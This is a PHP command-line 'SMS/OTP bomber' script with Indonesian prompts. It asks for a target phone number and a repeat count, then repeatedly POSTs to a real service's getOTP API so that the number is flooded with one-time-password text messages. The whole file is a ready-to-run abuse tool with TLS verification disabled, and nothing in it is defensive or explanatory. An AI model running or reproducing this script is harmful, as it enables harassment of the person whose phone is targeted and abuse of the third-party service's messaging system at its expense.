
<?php

system('clear');
sleep(0.23);
echo " 
  \033[31;1m__ _  _\033[31;1m___  \033[31;1m____   \033[31;1m__   \033[31;1m____  \033[31;1m____   \033[31;1m__   _  _ 
 \033[31;1m(  ( \( __ \(  _ \ /  \ / ___)(  _ \ / _\ ( \/ )
 \033[34;1m/    \033[34;1m/ (__ ( )   /\033[37;1m(  O )\___ \ ) __//    \/ \/ \
 \_)__)(____/(__\_) \__/ \033[34;1m(____/(__)  \_/\_/\_)\033[34;1m(_/
                                      
";
echo "\033[37;1m╔════════════════════════════════════════════════╗\n";
echo "\033[37;1m  \033[31;1m-  \033[31;1mAuthor  \033[0;37m: \033[31;1mXN3R013\n";
echo "\033[37;1m  \033[33;1m-  \033[33;1mSupport \033[0;37m:\033[33;1m Allah Swt & Doa Emaak\n";
echo "\033[37;1m  \033[32;1m-  \033[32;1mGithub  \033[0;37m:\033[32;1m https://github.com/rshaadzxnero13 \n";
echo "\033[37;1m╚════════════════════════════════════════════════╝\n";


echo " \033[31;1m- \033[37;1mTarget  \033[0;37m> \033[34;1m0";
$no = trim(fgets(STDIN));
echo "\033[31;1m - \033[37;1mJumlah  \033[0;37m>\033[34m ";
$jmlh = trim(fgets(STDIN));

$headers = array();
     $headers[] = 'LANG: en';
    $headers[] = 'Content-Type: application/json; charset=UTF-8';
    $headers[] = 'Content-Length: 44';
    $headers[] = 'Host: phr.gms.digital';
    $headers[] = 'Connection: close';
    $headers[] = 'Accept-Encoding: gzip, deflate';

    //otp
$i = 0;
while($i < $jmlh) {
    $gtop = "{\"memberToken\":\"\",\"receivers\":\"$no\"}";
    $gotp = curl('https://phr.gms.digital/api/user/getOTP', $gtop, $headers);
    $gots = json_decode($gotp[1]); 
    if($gots == true ){
       system('clear'); 
       sleep(2);
       echo " \033[0;37m> \033[37;1mBerhasil \033[33;1m[\033[32;1m✓\033[33;1m]\n"."\033[37m\n";
    }
  $i++;
  }

function curl($url, $fields = null, $headers = null)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        if ($fields !== null) {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $fields);
        }
        if ($headers !== null) {
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

        }
        $result   = curl_exec($ch);
        $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        return array(
            $result,
            $httpcode
        );
    }



?>
